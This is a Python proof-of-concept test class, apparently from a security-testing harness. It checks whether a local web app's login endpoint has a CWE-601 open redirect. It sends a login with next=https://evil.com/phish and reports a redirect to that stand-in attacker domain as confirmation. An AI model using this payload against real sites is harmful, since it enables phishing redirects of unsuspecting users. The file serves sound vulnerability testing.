"""PoC: Open redirect via ?next= parameter (CWE-601)."""
from mosaic.oracle.exploit import ExploitTest


class OpenRedirectExploit(ExploitTest):
    """Open redirect: login with next=https://evil.com redirects user off-site."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "express_open_redirect"

    def setup(self) -> None:
        # Register a test user
        self.http_post("/v1/auth/register", json={
            "name": "Redirect Test",
            "email": "redirect_test@example.com",
            "password": "password1",
        })

    def execute(self) -> tuple[bool, str]:
        evil_url = "https://evil.com/phish"
        evidence = []

        # Login with next= pointing to attacker domain, don't follow redirect
        resp = self.http_post(
            f"/v1/auth/login?next={evil_url}",
            json={"email": "redirect_test@example.com", "password": "password1"},
            follow_redirects=False,
        )

        evidence.append(f"Status: {resp.status_code}")

        # Check for redirect (3xx with Location header)
        location = resp.headers.get("Location", resp.headers.get("location", ""))
        evidence.append(f"Location header: {location}")

        if resp.status_code in (301, 302, 303, 307, 308) and "evil.com" in location:
            return True, (
                f"CWE-601 Open Redirect confirmed. "
                f"Login redirected to attacker URL: {location}. "
                + " | ".join(evidence)
            )

        # Also check response body for redirect URL (some impls use JS or meta redirect)
        if "evil.com" in resp.text:
            body_snippet = resp.text[:500]
            evidence.append(f"Body contains evil.com: {body_snippet}")
            return True, (
                f"CWE-601 Open Redirect confirmed in response body. "
                + " | ".join(evidence)
            )

        return False, "No open redirect detected. " + " | ".join(evidence)
